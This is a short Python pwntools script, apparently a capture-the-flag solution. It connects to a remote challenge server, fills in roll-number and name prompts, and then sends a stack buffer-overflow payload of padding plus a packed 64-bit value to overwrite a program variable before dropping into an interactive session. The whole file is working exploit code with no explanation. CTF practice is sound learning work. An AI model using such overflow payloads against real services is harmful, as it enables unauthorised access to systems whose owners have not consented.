from pwn import *

context.log_level = 'debug'

#p = process('./chal')
p = remote('34.70.212.151', 8004)

p.recvuntil(b'Roll Number : ')
p.sendline(b'23')

p.recvuntil(b'Name : ')
p.sendline(b'lorenzinco')

payload = b'A'*(0x50-0xC)+p64(100)

p.recvuntil(b'Any Comments ?\n')
p.sendline(payload)


p.interactive()